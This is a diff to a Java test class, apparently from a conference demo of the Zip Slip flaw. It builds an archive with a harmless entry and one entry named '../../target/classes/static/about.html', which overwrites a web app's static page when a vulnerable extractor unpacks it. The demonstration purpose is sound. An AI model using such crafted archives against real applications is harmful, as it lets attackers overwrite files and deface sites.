@@ -13,15 +13,16 @@ public class Test {
 
 
     public static void main(String[] args) throws IOException {
-        String content = new String(Files.readAllBytes(Paths.get("evil.html")));
+        String content = new String(Files.readAllBytes(Paths.get("evil.txt")));
+        System.out.println(content);
 
-        File f = new File("devoxxuk_evil.zip");
+
+        File f = new File("evil.zip");
         ZipOutputStream out = new ZipOutputStream(new FileOutputStream(f));
+        insertZipEntry(out, "good.txt", "This is a good textfile");
         insertZipEntry(out,
                 "../../target/classes/static/about.html",
-                content);
-
-        insertZipEntry(out, "good.txt", "This is a good textfile");
+                "<html><h1>About<h1></html>");
         out.close();
     }
 
@@ -38,20 +39,20 @@ public class Test {
     }
 
 
-    public void createZipFile(String zipFileName, List<File> files) throws IOException{
-        File zipFile = new File(zipFileName);
-        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile));
-
-        files.forEach(file -> insertIntoZipFile(zipOutputStream, file));
-        zipOutputStream.close();
-
-    }
-
-    private void insertIntoZipFile(ZipOutputStream zipOutputStream, File file) {
-        ZipEntry entry = new ZipEntry(file.getName());
-
-
-    }
+//    public void createZipFile(String zipFileName, List<File> files) throws IOException{
+//        File zipFile = new File(zipFileName);
+//        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile));
+//
+//        files.forEach(file -> insertIntoZipFile(zipOutputStream, file));
+//        zipOutputStream.close();
+//
+//    }
+//
+//    private void insertIntoZipFile(ZipOutputStream zipOutputStream, File file) {
+//        ZipEntry entry = new ZipEntry(file.getName());
+//
+//
+//    }
 
 
 }
